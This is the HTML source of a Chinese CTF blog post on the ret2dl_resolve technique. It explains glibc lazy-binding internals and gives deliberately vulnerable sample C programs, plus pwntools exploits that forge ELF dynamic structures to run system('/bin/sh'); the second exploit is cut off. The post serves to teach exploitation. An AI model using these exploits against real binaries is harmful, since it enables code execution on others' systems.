@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang=zh-CN>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        ret2dl_resolve - rot_will&#39;s Blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
+    <link href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.png" />
+        </div>
+        <div class="name">
+            <i>rot_will</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li >
+                <a href="/collect/">
+                    <i class="iconfont icon-shoucang1"></i>
+                    <span>收藏</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>搜索</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9dynamic"><span class="toc-text">修改dynamic</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0reloc-offset"><span class="toc-text">伪造reloc_offset</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0link-map"><span class="toc-text">伪造link_map</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-bg" id="search-bg"></div>
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        ret2dl_resolve
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2022-06-24 13:54:44</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#ctf" title="ctf">ctf</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#pwn" title="pwn">pwn</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content no-indent">
+        <p>是利用elf文件的延迟绑定技术<code>_dl_runtime_resolve</code>，达到攻击目的的一种技术<br>程序在执行时，程序<code>link_map</code>结构体的地址位于<code>got表</code>的第二项，<code>_dl_runtime_resolve</code>函数地址位于<code>got表</code>的第三项</p>
+<blockquote>
+<p>函数第一次调用前<br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-resolve.jpg"><br>在使用<code>_dl_runtime_resolve</code>导出函数时，会设置函数在<code>got表</code>中对应的项为函数真实地址<br>如果程序开启了<code>PIE</code>保护，那么会在加载程序的阶段，会将<code>got表</code>中对应函数的真实地址填入</p>
+</blockquote>
+<p><code>_dl_runtime_resolve</code> 在<code>sysdeps/架构/dl-trampoline.h</code>文件中，是一段汇编代码，通过栈传入两个参数，第一个参数是当前程序的<code>link_map结构体的地址</code>，第二个参数是函数在<code>.rel.plt表中的索引值</code>，函数首先保存寄存器的值，然后调用<code>_dl_fixup</code>函数，最后还原寄存器，并执行函数</p>
+<p><code>_dl_fixup</code>在<code>elf/dl-runtime.c</code>文件中，传入两个参数,参数与<code>_dl_runtime_resolve</code>的参数相同，函数先通过<code>link_map</code>获取程序中各种段的地址，经过各种检测后，通过<code>_dl_lookup_symbol_x</code>从<code>link_map.l_scope</code>中搜索符号，并返回符号地址，再经过各种检测后，如果未开启绑定，就直接返回符号地址，否则执行<code>elf_machine_fixup_plt</code>函数，设置<code>got表</code>中的数据</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 获取各种段的地址</span></span><br><span class="line"><span class="comment">    这些段的地址不是直接储存在 l_info中，而是储存在程序的 dynamic段中 */</span></span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">    <span class="comment">// 获取 dnysym 表地址</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line">    <span class="comment">// 获取 dnystr 表地址</span></span><br><span class="line"><span class="type">const</span> PLTREL *<span class="type">const</span> reloc = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="comment">// 获取函数在 rel.plt 中对应成员的地址</span></span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    <span class="comment">// 获取函数在 dynsym 中对应成员的地址</span></span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *refsym = sym;</span><br><span class="line"><span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">    <span class="comment">// 获取函数在 got 中对应成员的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 调用_dl_lookup_symbol_x */</span></span><br><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// strtab+sym-&gt;st_name 获取符号名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* rel.plt结构体(函数重定向的信息)</span></span><br><span class="line"><span class="comment">Elf32_Rela</span></span><br><span class="line"><span class="comment">	offset 指向GOT表的指针 4字节</span></span><br><span class="line"><span class="comment">	info 关于导入符号的信息 4字节</span></span><br><span class="line"><span class="comment">		当重定向函数时 info的第一个字节为 0x07</span></span><br><span class="line"><span class="comment">		info&gt;&gt;8 为函数符号在.dnysym 中的下标</span></span><br><span class="line"><span class="comment">	addend 浮动数值 4字节</span></span><br><span class="line"><span class="comment">		通过 &amp;.dnysym[info]+addend 为表示函数的 .dnysym中的成员</span></span><br><span class="line"><span class="comment">		</span></span><br><span class="line"><span class="comment">Elf64_Rela</span></span><br><span class="line"><span class="comment">	offset 指向GOT表的指针 8字节</span></span><br><span class="line"><span class="comment">	info 关于导入符号的信息 8字节</span></span><br><span class="line"><span class="comment">		当重定向函数时 info的 前4字节 为 0x07</span></span><br><span class="line"><span class="comment">		info的后4字节为函数符号在 .dnysym 中的下标</span></span><br><span class="line"><span class="comment">	addend 浮动数值 8字节</span></span><br><span class="line"><span class="comment">		通过 &amp;.dnysym[info]+addend 为表示函数的 .dnysym中的成员</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* dynsym结构体 </span></span><br><span class="line"><span class="comment">Elf32_Sym</span></span><br><span class="line"><span class="comment">	name 对于.dnystr 的偏移 4字节</span></span><br><span class="line"><span class="comment">	value 4字节</span></span><br><span class="line"><span class="comment">		如果这个符号被导出，则存有这个导出函数的虚拟地址，否则为NULL</span></span><br><span class="line"><span class="comment">		当成员是用来描述函数时 value为0</span></span><br><span class="line"><span class="comment">	size 4字节</span></span><br><span class="line"><span class="comment">		符号大小</span></span><br><span class="line"><span class="comment">		当成员是用来描述函数时 size为0</span></span><br><span class="line"><span class="comment">	info 符号的信息 1字节</span></span><br><span class="line"><span class="comment">		当成员是用来描述函数时 info为0x12</span></span><br><span class="line"><span class="comment">	other 1字节</span></span><br><span class="line"><span class="comment">		当成员是用来描述函数时 other为0</span></span><br><span class="line"><span class="comment">	shndx 2字节</span></span><br><span class="line"><span class="comment">		绑定section的索引号</span></span><br><span class="line"><span class="comment">		当成员是用来描述函数时 shndx 为0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Elf64_Sym</span></span><br><span class="line"><span class="comment">	name 对于.dnystr的偏移 4字节</span></span><br><span class="line"><span class="comment">	info 符号的信息 1字节</span></span><br><span class="line"><span class="comment">		当成员是用来描述函数时 info为0x12</span></span><br><span class="line"><span class="comment">	other 显示形式 1字节</span></span><br><span class="line"><span class="comment">		描述函数时 other为0</span></span><br><span class="line"><span class="comment">	shndx 绑定的section的索引号 2字节</span></span><br><span class="line"><span class="comment">		描述函数时 shndx 为0</span></span><br><span class="line"><span class="comment">	value 8字节</span></span><br><span class="line"><span class="comment">		如果这个符号被导出，则存有这个导出函数的got地址-8，否则为NULL</span></span><br><span class="line"><span class="comment">		当成员是用来描述函数时 value为0</span></span><br><span class="line"><span class="comment">	size 8字节</span></span><br><span class="line"><span class="comment">		符号大小</span></span><br><span class="line"><span class="comment">		当成员是用来描述函数时 size为0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* dynamic结构体</span></span><br><span class="line"><span class="comment">Elf32_Dyn</span></span><br><span class="line"><span class="comment">	tag 指定结构用来描述的段类型  4字节</span></span><br><span class="line"><span class="comment">	val/ptr  4字节</span></span><br><span class="line"><span class="comment">		当用来描述某个段的地址时使用 ptr</span></span><br><span class="line"><span class="comment">		其余情况使用val</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Elf64_Dyn</span></span><br><span class="line"><span class="comment">	tag 指定结构用来描述的段类型  4字节</span></span><br><span class="line"><span class="comment">	val/ptr 8字节</span></span><br><span class="line"><span class="comment">		当用来描述某个段的地址时使用 ptr</span></span><br><span class="line"><span class="comment">		其余情况使用val</span></span><br><span class="line"><span class="comment">tag可选值：</span></span><br><span class="line"><span class="comment">    #define DT_NULL 0              标记动态部分的结束</span></span><br><span class="line"><span class="comment">    #define DT_NEEDED 1            所需库的名称</span></span><br><span class="line"><span class="comment">    #define DT_PLTRELSZ 2          PLT 重定位的字节大小</span></span><br><span class="line"><span class="comment">    #define DT_PLTGOT 3            处理器定义的值</span></span><br><span class="line"><span class="comment">    #define DT_HASH 4              符号哈希表地址</span></span><br><span class="line"><span class="comment">    #define DT_STRTAB 5            字符串表地址</span></span><br><span class="line"><span class="comment">    #define DT_SYMTAB 6            符号表地址</span></span><br><span class="line"><span class="comment">    #define DT_RELA7               Rela relocs地址</span></span><br><span class="line"><span class="comment">    #define DT_RELASZ 8            Rela reloc 的总大小</span></span><br><span class="line"><span class="comment">    #define DT_RELAENT 9           一个 Rela reloc 的大小</span></span><br><span class="line"><span class="comment">    #define DT_STRSZ 10            字符串表的大小</span></span><br><span class="line"><span class="comment">    #define DT_SYMENT 11           一个符号表的大小入口</span></span><br><span class="line"><span class="comment">    #define DT_INIT 12             init 函数的地址</span></span><br><span class="line"><span class="comment">    #define DT_FINI 13             储存fini函数的指针地址(会在exit中执行)</span></span><br><span class="line"><span class="comment">    #define DT_SONAME 14           共享对象的名称</span></span><br><span class="line"><span class="comment">    #define DT_RPATH 15            库搜索路径（不推荐使用）</span></span><br><span class="line"><span class="comment">    #define DT_SYMBOLIC 16         从这里开始符号搜索</span></span><br><span class="line"><span class="comment">    #define DT_REL 17              Rel reloc 的地址</span></span><br><span class="line"><span class="comment">    #define DT_RELSZ 18            Rel reloc 的总大小</span></span><br><span class="line"><span class="comment">    #define DT_RELENT 19           一个 Rel reloc 的大小</span></span><br><span class="line"><span class="comment">    #define DT_PLTREL 20           PLT 中的 reloc 类型</span></span><br><span class="line"><span class="comment">    #define DT_DEBUG 21            用于调试；unspecified</span></span><br><span class="line"><span class="comment">    #define DT_TEXTREL 22          Reloc 可能会修改 .text</span></span><br><span class="line"><span class="comment">    #define DT_JMPREL 23           PLT relocs 的地址</span></span><br><span class="line"><span class="comment">    #define DT_BIND_NOW 24         对象的进程重定位</span></span><br><span class="line"><span class="comment">    #define DT_INIT_ARRAY 25       带有 init fct 地址的数组</span></span><br><span class="line"><span class="comment">    #define DT_FINI_ARRAY 26       带有 fini fct 地址的数组</span></span><br><span class="line"><span class="comment">    #define DT_INIT_ARRAYSZ 27     以字节为单位的大小DT_INIT_ARRAY</span></span><br><span class="line"><span class="comment">    #define DT_FINI_ARRAYSZ 28     DT_FINI_ARRAY 的字节大小</span></span><br><span class="line"><span class="comment">    #define DT_RUNPATH 29          库搜索路径</span></span><br><span class="line"><span class="comment">    #define DT_FLAGS 30            正在加载的对象的标志</span></span><br><span class="line"><span class="comment">    #define DT_ENCODING 32         编码开始range</span></span><br><span class="line"><span class="comment">    #define DT_PREINIT_ARRAY 32    带有 preinit fct 地址的数组</span></span><br><span class="line"><span class="comment">    #define DT_PREINIT_ARRAYSZ 33  DT_PREINIT_ARRAY 的字节大小</span></span><br><span class="line"><span class="comment">    #define DT_NUM 34              使用的数量</span></span><br><span class="line"><span class="comment">    #define DT_LOOS 0x6000000d     操作系统特定的开始</span></span><br><span class="line"><span class="comment">    #define DT_HIOS 0x6ffff000     操作系统特定的结束</span></span><br><span class="line"><span class="comment">    #define DT_LOPROC 0x70000000   处理器特定的开始</span></span><br><span class="line"><span class="comment">    #define DT_HIPROC 0x7fffffff   处理器特定的结束</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* dnystr段结构 </span></span><br><span class="line"><span class="comment">    开头第一个字节为\x00,后面储存的每个符号的名称，以\x00结尾</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<p><code>_dl_lookup_symbol_x</code>在<code>elf/dl-lookup.c</code>文件中，传入7个参数，分别是 <code>符号名称</code>，<code>link_map</code>，<code>符号在dnysym中对应成员的地址</code>，<code>link_map引用的符号表</code>(里面是保存了用于引用的<code>link_map结构体</code>信息)，<code>版本</code>，<code>符号类型</code>，<code>符号版本信息</code>，<code>跳过的link_map</code>(不查找这个文件中的符号) ，遍历<code>scope</code>中的结构体，排除跳过的<code>link_map</code>，使用 <code>do_lookup_x</code> 从剩余的<code>link_map</code>中搜索符号，当搜索到符号时，返回结构体<code>&#123;符号地址,当前link_map&#125;</code></p>
+<p><code>do_lookup_x</code>在<code>elf/dl-lookup.c</code>文件中，传入13个参数，主要流程为，循环遍历当前<code>link_map</code>表示的文件及其引用的文件中的符号，通过遍历对比文件中的符号名称与传入<code>_dl_lookup_symbol_x</code>的符号名称，来搜索符号，当搜索到符号时，返回 <code>&#123;符号地址,符号所属link_map&#125;</code></p>
+<h2 id="修改dynamic"><a href="#修改dynamic" class="headerlink" title="修改dynamic"></a>修改dynamic</h2><blockquote>
+<p>从 <code>_dl_fixup</code> 中的代码中可以看出，程序获取段地址与 符号在表中的地址，都是通过<code>dynamic段</code>中的数据<br>我们可以修改 <code>dynamic段</code>中的 <code>DT_STRTAB</code> 的值为我们伪造的地址<br>在调用<code>got表</code>中未执行过的函数时，使其通过<code>DT_STARTAB</code>获取到符号名称为我们需要的函数<br>在执行<code>_dl_runtime_resolve</code>时就会自动执行我们需要的函数，并将<code>got表</code>中对应的项设置为我们需要的函数<br>这种利用方法需要程序关闭了 <code>ROLRO保护</code>，否则<code>.dynamic</code> 段不可写，也就无法达到攻击的效果了</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 样例代码 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> cache[<span class="number">0x30</span>]=&#123;&#125;;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> state=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> c[<span class="number">0x40</span>]=&#123;&#125;;</span><br><span class="line">    read(<span class="number">0</span>,cache,<span class="number">0x50</span>);</span><br><span class="line">    c[read(<span class="number">0</span>,c,<span class="number">0x10</span>)<span class="number">-1</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *a=atoi(c);</span><br><span class="line">    c[read(<span class="number">0</span>,c,<span class="number">0x10</span>)<span class="number">-1</span>]=<span class="number">0</span>;</span><br><span class="line">    *a=atoi(c);</span><br><span class="line">    <span class="built_in">exit</span>(state);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*编译命令</span></span><br><span class="line"><span class="comment">    gcc -z norelro -no-pie pwn_resolve.c -o pwn_resolve</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>main函数代码</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-resolve-1.jpg"></p>
+<p><strong>bss段布局</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-resolve-2.jpg"></p>
+<p><strong>dynamic段布局</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-resolve-3.jpg"></p>
+<p><strong>dynstr段布局</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-resolve-4.jpg"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;exp思路</span></span><br><span class="line"><span class="string">    设置 dynamic段 中 dynstr段 的地址为  bss段 中构造的 &quot;\x00system\x00&quot; 字符串的地址</span></span><br><span class="line"><span class="string">    并设置 state 为 bss段 中构造的 &quot;/bin/sh&quot; 字符串的地址</span></span><br><span class="line"><span class="string">    在执行 exit 函数时 经过 _dl_runtime_resolve 就会搜索 system 函数并执行 system(&quot;/bin/sh&quot;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwn_resolve&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">&quot;system\x00&quot;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x30</span>)+p64(<span class="number">0x4033c0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x4031e0</span>))</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x4033c7</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="伪造reloc-offset"><a href="#伪造reloc-offset" class="headerlink" title="伪造reloc_offset"></a>伪造reloc_offset</h2><blockquote>
+<p>从<code>_dl_fixup</code>中的代码可以看出，程序获取与函数对应的<code>rel.plt表项</code> <code>reloc</code>是通过<code>reloc_offset</code>参数<br>获取对应的<code>dnysym表项</code> <code>sym</code>是通过<code>reloc.r_info</code> ，获取<code>dnystr</code>对应的名称是通过<code>sym</code><br>所以只要伪造了<code>reloc_offset</code> 参数，就可以伪造<code>reloc</code>，进而伪造 <code>sym</code> 与 <code>dnystr</code>中对应的名称<br>然后就会调用我们伪造的<code>dnystr</code>中的函数</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 样例代码 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> cache[<span class="number">0x50</span>]=&#123;&#125;;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> state=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> c[<span class="number">0x40</span>]=&#123;&#125;;</span><br><span class="line">    read(<span class="number">0</span>,cache,<span class="number">0x70</span>);</span><br><span class="line">    read(<span class="number">0</span>,c,<span class="number">0x70</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*编译命令</span></span><br><span class="line"><span class="comment">    gcc -fno-stack-protector -no-pie pwn_resolve.c -o pwn_resolve</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>main函数代码</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-resolve1.jpg"></p>
+<p><strong>main函数栈布局</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-resolve1-1.jpg"></p>
+<p><strong>bss段布局</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-resolve1-2.jpg"></p>
+<p><strong>.dynamic段布局</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-resolve1-3.jpg"></p>
+<p><strong>dynsym段布局</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-resolve1-4.jpg"></p>
+<p><strong>dynstr段布局</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-resolve1-5.jpg"></p>
+<p><strong>rel.plt段布局</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-resolve1-6.jpg"></p>
+<p><code>rel表项</code>需要构造 {对应<code>got表</code>地址(8字节), <code>sym表</code>中的索引值(4字节), 用来表示函数的<code>7</code>(4字节), <code>addend</code>用处未知一般为<code>0</code>(4字节)}<br><code>sym表项</code>需要构造 {<code>dnystr</code>中的索引值(4字节), 用来表示函数的<code>12</code>(1字节), <code>other</code>描述函数时为<code>0</code>(1字节), <code>shndx</code>描述函数时为0(2字节), <code>value</code>在函数被导出前为<code>0</code>(4字节), <code>size</code>描述函数时为<code>0</code>(4字节)}<br><code>dnystr表项</code>构造时只需要在字符串结尾使用<code>\x00</code>截断</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;exp思路</span></span><br><span class="line"><span class="string">    构造 全局变量cache ,将 sym表项 与 rel表项 ，dnystr表项 都伪造好，</span></span><br><span class="line"><span class="string">    通过传入一个较大的 rel.plt表 索引值,</span></span><br><span class="line"><span class="string">    使其索引到我们伪造的表项,进而导出 system 函数，并执行 system 函数</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">rdi=<span 